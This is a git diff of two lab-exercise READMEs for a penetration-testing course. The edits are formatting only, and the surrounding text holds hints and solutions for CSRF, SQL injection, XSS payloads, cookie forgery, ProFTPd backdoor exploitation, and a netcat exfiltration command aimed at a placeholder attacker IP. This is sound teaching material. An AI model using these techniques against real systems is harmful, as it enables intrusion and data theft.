@@ -1,0 +1,344 @@
+diff --git a/Exercises/Basic web application vulnerabilities/README.md b/Exercises/Basic web application vulnerabilities/README.md
+index 24079f7..5542b59 100644
+--- a/Exercises/Basic web application vulnerabilities/README.md	
++++ b/Exercises/Basic web application vulnerabilities/README.md	
+@@ -40,6 +40,7 @@ Look for destructive actions in the application that don't require additional co
+ -The request might be accepted from any origin  
+ 
+ Try examining what happens when you navigate directly to certain URLs while logged in.
++
+ </details>
+ 
+ <details markdown="1">
+@@ -50,8 +51,11 @@ CSRF attacks work by:
+ 2. Creating a malicious HTML page that automatically makes the request  
+ 3. Tricking a logged-in user to visit your malicious page  
+ 
+-For GET-based CSRF attacks, you can use simple HTML elements like img tags or iframe elements that automatically load URLs.
+-</details><details>
++For GET-based CSRF attacks, you can use simple HTML elements like `<img>` tags or `<iframe>` elements that automatically load URLs.
++
++</details>
++
++<details>
+ <summary>🔓 <strong>Solution</strong> (Click to expand)</summary>
+ 
+ **Primary Attack Vector: Hidden Form Auto-Submit**  
+@@ -95,6 +99,7 @@ For GET-based CSRF attacks, you can use simple HTML elements like img tags or if
+ **Why it works:** The application doesn't validate that the request came from its own forms (no CSRF tokens) and accepts destructive GET requests.  
+   
+ **Note:** This application contains other CSRF vulnerabilities in password changes and username modifications if you wish to explore less destructive attack vectors.  
++
+ </details>
+ 
+ ---
+@@ -117,6 +122,7 @@ Look for input fields that might be directly inserted into SQL queries without p
+ - Credit/account details pages  
+ 
+ Try entering SQL metacharacters like single quotes (`'`) to see if you get database errors.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -128,6 +134,7 @@ SQL Injection techniques to try:
+ - **Error-based**: Use malformed queries to extract database information  
+ 
+ Look at URLs with parameters like `/credit/1` - can you manipulate the `1` to inject SQL?  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -161,6 +168,7 @@ Look at URLs with parameters like `/credit/1` - can you manipulate the `1` to in
+ **Why it works:** The application constructs SQL queries through string concatenation: `SELECT * FROM credit WHERE userid=` + user_input, allowing attackers to inject arbitrary SQL code.  
+ 
+ **Note:** This application has other SQL injection points in the login form and username change functionality if you wish to explore authentication bypass and other attack vectors.  
++
+ </details>
+ 
+ ---
+@@ -183,6 +191,7 @@ Look for input fields where user data gets stored and then displayed to other us
+ - Any field that appears on pages viewed by others  
+   
+ The key is finding where input is stored in the database and later displayed without proper HTML escaping.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -194,6 +203,7 @@ XSS payloads to try:
+ - **SVG**: `&lt;svg onload="alert('XSS')"&gt;`  
+ 
+ Look at the "Update Account Settings" page - there might be different fields for username vs display name. The display name field might be more vulnerable since it's shown on the profile page.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -217,7 +227,8 @@ Look at the "Update Account Settings" page - there might be different fields for
+ 
+ **Why it works:** The application stores user input and displays it without sanitization which allows JavaScript execution.  
+ 
+-**Note:** This application has other potential XSS vectors in comment fields and other user-controlled content if you wish to explore different injection points.  
++**Note:** This application has other potential XSS vectors in comment fields and other user-controlled content if you wish to explore different injection points.
++
+ </details>
+ 
+ ---
+@@ -239,6 +250,7 @@ Session hijacking can occur through various methods:
+ - **Weak session tokens**: Predictable or easily guessable session IDs  
+ 
+ Look at the cookies set by the application when you login. Examine their properties and values using browser Developer Tools → Application → Cookies.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -250,6 +262,7 @@ Check the session implementation:
+ - Can you manually set cookie values to impersonate other users?  
+ 
+ Try logging in as different users and compare their session cookies. Look for patterns in `userid` and `userhash` values. You might be able to craft cookies for other users.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -285,7 +298,8 @@ Try logging in as different users and compare their session cookies. Look for pa
+    -Cookies aren't marked as `HttpOnly` (accessible via JavaScript)  
+    -No `Secure` flag means cookies can be transmitted over HTTP  
+ 
+-**Note:** This application has additional session vulnerabilities including predictable userhash patterns and session fixation possibilities if you wish to explore more sophisticated attack vectors.  
++**Note:** This application has additional session vulnerabilities including predictable userhash patterns and session fixation possibilities if you wish to explore more sophisticated attack vectors.
++
+ </details>
+ 
+ ---
+@@ -318,6 +332,7 @@ Once you have a username, choose either:
+ The login page provides different error messages or response behaviors for valid vs invalid usernames. This is called "username enumeration."  
+ 
+ Start with your known credentials (`Johnnydepp` / `Pirates`) and observe the application's theme. The application appears to be themed around a famous movie franchise - try other character names from that universe.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -328,6 +343,7 @@ Pirates of the Caribbean characters to try:
+ - Other characters: `Davy`, `Jones`, `Calypso`, `Bootstrap`  
+ 
+ Try these usernames with any password and observe the login response differences between valid and invalid usernames.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -356,6 +372,7 @@ Try these usernames with any password and observe the login response differences
+    -Invalid usernames will show "User not found" or similar  
+    -This difference allows you to enumerate all valid usernames  
+    **Result:** You now have valid target usernames: `Jacksparrow` and `Barbossa`  
++
+ </details>
+ 
+ ---
+@@ -368,6 +385,7 @@ Try these usernames with any password and observe the login response differences
+ Examine how the application handles authentication in other pages after you log in. Look at the cookies and form parameters used in requests like `/changepassword`. The application might use predictable session tokens or hashes you can exploit.  
+ 
+ Use Browser Developer Tools to intercept and modify requests. Tools like Burp Suite can also help capture and replay modified requests.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -376,6 +394,7 @@ Use Browser Developer Tools to intercept and modify requests. Tools like Burp Su
+ The `userhash` parameter in forms might be predictable. Try analyzing a valid request to see if you can determine how a userhash is generated from a username. Then, you might be able to craft valid requests for other users.  
+ 
+ Try using `/changepassword` with a modified `userhash` value.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -414,6 +433,7 @@ Try using `/changepassword` with a modified `userhash` value.
+    -You now have complete access to their account  
+ 
+ **Why it works:** The application trusts the client-provided userhash without proper server-side validation. Since the server does not verify that the hash you provided corresponds to the account you logged in with, it trusts the hash and modifies another account's password.  
++
+ </details>
+ 
+ ---
+@@ -426,6 +446,7 @@ Try using `/changepassword` with a modified `userhash` value.
+ Many users choose weak, common passwords. The rockyou.txt wordlist contains millions of commonly used passwords from real data breaches.  
+ 
+ You can download rockyou.txt from security websites or use a smaller common password list. Try passwords related to the Pirates of the Caribbean theme first.  
++
+ </details>
+ 
+ <details markdown="1">
+@@ -471,6 +492,7 @@ Use Burp Suite's Intruder feature to automate password attempts, or try them man
+    -Access their profiles, credit information, and account settings  
+ 
+ **Why it works:** Users often choose predictable, personally relevant passwords or very common passwords that appear in common password lists.  
++
+ </details>
+ 
+ ---
+diff --git a/Exercises/FTP Service Exploitation/README.md b/Exercises/FTP Service Exploitation/README.md
+index e9fe3ed..03a411f 100644
+--- a/Exercises/FTP Service Exploitation/README.md	
++++ b/Exercises/FTP Service Exploitation/README.md	
+@@ -35,7 +35,7 @@ Before starting this exercise, ensure you have:
+ ### Question
+ **Scan the target network to identify live hosts and discover the FTP service. What version of ProFTPd is running and on which port?**
+ 
+-<details>
++<details markdown="1">
+ <summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>
+ 
+ Start with basic network discovery:  
+@@ -44,9 +44,10 @@ Start with basic network discovery:
+ - Once you find live hosts, scan for services on those specific IPs  
+ 
+ Remember that FTP typically runs on port 21, but it could be on a different port.  
++
+ </details>
+ 
+-<details>
++<details markdown="1">
+ <summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>
+ 
+ For detailed service detection:  
+@@ -56,9 +57,10 @@ For detailed service detection:
+ - Use `-A` for aggressive scanning (includes version detection, script scanning, OS detection)  
+ 
+ Example: `nmap -sV -sC -p 1-1000 <target_ip>`  
++
+ </details>
+ 
+-<details>
++<details markdown="1">
+ <summary>🔓 <strong>Solution</strong> (Click to expand)</summary>
+ 
+ **Network Discovery and Service Enumeration:**  
+@@ -92,6 +94,7 @@ Example: `nmap -sV -sC -p 1-1000 <target_ip>`
+    - **Port**: 21/tcp (standard FTP port)  
+ 
+ **Why this matters:** ProFTPd 1.3.3c contains a known backdoor vulnerability that allows unauthenticated remote code execution through a malicious response trigger.  
++
+ </details>
+ 
+ ---
+@@ -104,7 +107,7 @@ Example: `nmap -sV -sC -p 1-1000 <target_ip>`
+ ### Question
+ **Research and exploit a vulnerability in the identified ProFTPd version to gain root access on the target system. Use Metasploit to automate the exploitation process.**
+ 
+-<details>
++<details markdown="1">
+ <summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>
+ 
+ Research the specific ProFTPd version you identified (1.3.3c) online:  
+@@ -114,9 +117,10 @@ Research the specific ProFTPd version you identified (1.3.3c) online:
+ - The vulnerability you're looking for allows unauthorized access without proper authentication  
+ 
+ Once you identify the vulnerability, look for corresponding Metasploit modules using `search proftpd` in msfconsole.  
++
+ </details>
+ 
+-<details>
++<details markdown="1">
+ <summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>
+ 
+ The exploit process involves exploiting a backdoor vulnerability in this version of ProFTPd using metasploit. Look for modules mentioning ProFTPd and backdoors on Unix.  
+@@ -125,9 +129,10 @@ Key Metasploit commands:
+ - Use `search proftpd` to find relevant exploits  
+ - Look for modules that mention "backdoor" in their description  
+ - The exploit will automatically provide root access once executed  
++
+ </details>
+ 
+-<details>
++<details markdown="1">
+ <summary>🔓 <strong>Solution</strong> (Click to expand)</summary>
+ 
+ **ProFTPd 1.3.3c Backdoor Vulnerability:**  
+@@ -196,7 +201,8 @@ Key Metasploit commands:
+ - **Connection refused**: Make sure the FTP service is running on port 21  
+ - **No reverse connection**: Check that your LHOST is set to your actual IP address (not localhost) and that the target can reach your machine  
+ - **Firewall blocking**: Ensure the LPORT (4444) is not blocked by your firewall  
+-- **Network connectivity**: Verify bidirectional network connectivity between attacker and target machines  
++- **Network connectivity**: Verify bidirectional network connectivity between attacker and target machines
++
+ </details>
+ 
+ ---
+@@ -209,7 +215,7 @@ Key Metasploit commands:
+ ### Question
+ **Use netcat to extract an encrypted PDF file from the compromised system. The file contains sensitive information that needs to be transferred securely to your attacking machine for analysis.**
+ 
+-<details>
++<details markdown="1">
+ <summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>
+ 
+ Netcat file transfer involves two steps:  
+@@ -221,9 +227,10 @@ The basic syntax:
+ - Sending: `nc <attacker_ip> <port> < file_to_send.pdf`  
+ 
+ First, you need to locate the PDF file on the compromised system.  
++
+ </details>
+ 
+-<details>
++<details markdown="1">
+ <summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>
+ 
+ Steps to find and extract the PDF:  
+@@ -235,9 +242,10 @@ For the netcat transfer:
+ - Choose an unused port (e.g., 9999)  
+ - Ensure the port isn't blocked by firewalls  
+ - Start the listener first, then initiate the transfer  
++
+ </details>
+ 
+-<details>
++<details markdown="1">
+ <summary>🔓 <strong>Solution</strong> (Click to expand)</summary>
+ 
+ **File Discovery and Extraction Process:**  
+@@ -303,6 +311,7 @@ For the netcat transfer:
+    ```  
+ 
+ **Why use netcat:** Netcat provides a simple, reliable method for transferring files between systems without requiring complex file-sharing protocols. It's particularly useful in penetration testing scenarios where you need to exfiltrate data quickly and quietly.  
++
+ </details>
+ 
+ ---
+@@ -315,7 +324,7 @@ For the netcat transfer:
+ ### Question
+ **Crack the password of the encrypted PDF file using John the Ripper and the pdf2john.py script. What sensitive information does the decrypted document contain?**
+ 
+-<details>
++<details markdown="1">
+ <summary>💡 <strong>Hint 1</strong> (Click to expand)</summary>
+ 
+ PDF password cracking with John requires two steps:  
+@@ -323,9 +332,10 @@ PDF password cracking with John requires two steps:
+ 2. **Crack the hash**: Use `john` with wordlists to crack the extracted hash  
+ 
+ On Kali Linux, `pdf2john` should be available as a command. If you're using a different distribution or custom setup, you can find it in the John the Ripper source code at `/usr/share/john/` or install it separately.  
++
+ </details>
+ 
+-<details>
++<details markdown="1">
+ <summary>💡 <strong>Hint 2</strong> (Click to expand)</summary>
+ 
+ Common workflow for PDF password cracking:  
+@@ -339,9 +349,10 @@ Popular wordlists to try:
+ - Custom wordlists related to the target organization  
+ 
+ The password might be related to the company/theme of your exercise.  
++
+ </details>
+ 
+-<details>
++<details markdown="1">
+ <summary>🔓 <strong>Solution</strong> (Click to expand)</summary>
+ 
+ **PDF Password Cracking Process:**  
+@@ -424,6 +435,7 @@ The password might be related to the company/theme of your exercise.
+    ```  
+ 
+ **Why it works:** John the Ripper uses optimized algorithms to test millions of password combinations per second against the PDF's encryption. The pdf2john utility (pre-installed on Kali Linux) extracts the specific hash format that John can recognize and crack efficiently.  
++
+ </details>
+ 
+ ---
